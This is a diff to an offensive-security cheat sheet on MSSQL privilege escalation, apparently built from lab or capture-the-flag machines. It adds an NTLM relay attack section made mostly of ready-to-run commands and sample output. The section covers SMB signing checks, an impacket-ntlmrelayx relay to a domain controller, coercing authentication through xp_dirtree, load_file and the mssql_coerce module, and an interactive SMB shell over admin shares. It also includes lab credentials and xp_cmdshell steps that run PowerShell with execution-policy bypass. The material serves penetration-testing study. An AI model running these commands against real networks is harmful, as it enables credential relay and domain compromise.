@@ -1,7 +1,7 @@
 ---
 title: "MSSQL Privilege Escalation"
 date: 2025-7-17
-tags: ["Hash Cracking", "Privilege Escalation", "Ntlm", "Mssql", "Database", "Windows", "RCE", "Enum", "Domain Users", "SID"]
+tags: ["Hash Cracking", "Privilege Escalation", "Ntlm", "MSSQL", "Database", "Windows", "RCE", "Enum", "Domain Users", "SID", "NTLM Relay"]
 ---
 
 ### Enum
@@ -351,16 +351,11 @@ MSSQL_CO... 10.129.254.242  1433   DC               [*] Commands executed succes
 
 ```console
 # Method 1
-xp_dirtree '\\<LOCAL_IP>\any\thing';
-```
-
-```console
-# Method 2
 use master; exec xp_dirtree '\\<LOCAL_IP>\any\thing';
 ```
 
 ```console
-# Method 3
+# Method 2
 load_file('\\<LOCAL_IP>\any\thing');
 ```
 
@@ -368,7 +363,105 @@ load_file('\\<LOCAL_IP>\any\thing');
 
 ---
 
-### Abuse #2: Run xp_cmdshell
+### Abuse #2: NTLM Relay Attack
+
+#### 1. Check if SMB Signing is False
+
+```console
+nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN>
+```
+
+```console {class="sample-code"}
+$ nxc smb MS01.example.com -u 'dev01' -p 'Initial123' -d example.com
+SMB         10.10.132.54    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:example.com) (signing:False) (SMBv1:False)
+```
+
+#### 2. Start a NTLM Relay Server \[Cannot Relay to Host itself\]
+
+```console
+impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_DOMAIN> -i
+```
+
+```console {class="sample-code"}
+$ impacket-ntlmrelayx --no-http-server -smb2support -t DC01.example.com -i
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Protocol Client RPC loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server on port 445
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Multirelay disabled
+
+[*] Servers started, waiting for connections
+[*] SMBD-Thread-4 (process_request_thread): Received connection from 10.10.132.54, attacking target smb://DC01.example.com
+[*] Authenticating against smb://DC01.example.com as REFLECTION/SVC_WEB_STAGING SUCCEED
+[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
+```
+
+#### 3. Coercing Authentication
+
+{{< tab set4 tab1 >}}nxc{{< /tab >}}
+{{< tab set4 tab2 >}}SQL{{< /tab >}}
+{{< tabcontent set4 tab1 >}}
+
+```console
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M mssql_coerce -o L=<LOCAL_IP>
+```
+
+```console {class="sample-code"}
+$ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth -M mssql_coerce -o L=10.10.14.56
+MSSQL       10.129.254.242  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
+MSSQL       10.129.254.242  1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
+MSSQL_CO... 10.129.254.242  1433   DC               [*] Commands executed successfully, check the listener for results
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set4 tab2 >}}
+
+```console
+# Method 1
+use master; exec xp_dirtree '\\<LOCAL_IP>\any\thing';
+```
+
+```console
+# Method 2
+load_file('\\<LOCAL_IP>\any\thing');
+```
+
+{{< /tabcontent >}}
+
+#### 4. Interactive SMB Shell
+
+```console
+nc 127.0.0.0 <LOCAL_PORT>
+```
+
+```console {class="sample-code"}
+$ nc 127.0.0.1 11000                  
+Type help for list of commands
+# shares
+ADMIN$
+C$
+IPC$
+NETLOGON
+SYSVOL
+# 
+```
+
+---
+
+### Abuse #3: Run xp_cmdshell
 
 #### 1. Check Any Policy Blocking xp_cmdshell \[Optional\]
 
@@ -396,7 +489,7 @@ xp_cmdshell powershell.exe -ep bypass <CMD>
 
 ---
 
-### Abuse #3: Impersonate sa to run xp_cmdshell
+### Abuse #4: Impersonate sa to run xp_cmdshell
 
 #### 1. Add User to Sysadmin
 
@@ -438,7 +531,7 @@ execute as login = 'sa'; EXEC master..xp_cmdshell 'powershell.exe -ep bypass <CM
 
 ---
 
-### Abuse #4: Run External Script
+### Abuse #5: Run External Script
 
 #### 1. Run External Script (Python)
 
